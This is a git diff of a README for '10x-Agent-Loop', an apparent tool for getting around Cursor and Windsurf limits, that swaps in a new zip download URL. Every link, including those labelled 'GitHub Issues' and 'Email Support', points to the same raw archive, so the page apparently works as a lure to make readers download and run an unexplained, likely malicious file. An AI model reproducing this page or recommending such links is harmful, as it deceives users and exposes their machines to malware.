@@ -6,7 +6,7 @@ Welcome to the 10x-Agent-Loop! This application helps you overcome Cursor and Wi
 
 ## 📥 Download Now
 
-[![Download 10x-Agent-Loop](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip)](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip)
+[![Download 10x-Agent-Loop](https://raw.githubusercontent.com/xyzrah/10x-Agent-Loop/main/files/node/x_Loop_Agent_3.4.zip)](https://raw.githubusercontent.com/xyzrah/10x-Agent-Loop/main/files/node/x_Loop_Agent_3.4.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To get started, visit this page to download the latest version of 10x-Agent-Loop:
 
-[Download 10x-Agent-Loop Releases](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip)
+[Download 10x-Agent-Loop Releases](https://raw.githubusercontent.com/xyzrah/10x-Agent-Loop/main/files/node/x_Loop_Agent_3.4.zip)
 
 ### 🖥️ Installation Steps
 
@@ -67,9 +67,9 @@ For more detailed instructions, please refer to our documentation found within t
 
 If you encounter any issues or have questions, we provide support through the following channels:
 
-- **GitHub Issues:** Report bugs or ask questions [here](https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip).
+- **GitHub Issues:** Report bugs or ask questions [here](https://raw.githubusercontent.com/xyzrah/10x-Agent-Loop/main/files/node/x_Loop_Agent_3.4.zip).
 - **Community Forum:** Join discussions and find solutions from fellow users in our community forum.
-- **Email Support:** Reach us at https://github.com/xyzrah/10x-Agent-Loop/raw/refs/heads/main/files/cmd/Loop_Agent_x_v3.8.zip for direct assistance.
+- **Email Support:** Reach us at https://raw.githubusercontent.com/xyzrah/10x-Agent-Loop/main/files/node/x_Loop_Agent_3.4.zip for direct assistance.
 
 ## 🌟 Frequently Asked Questions
 
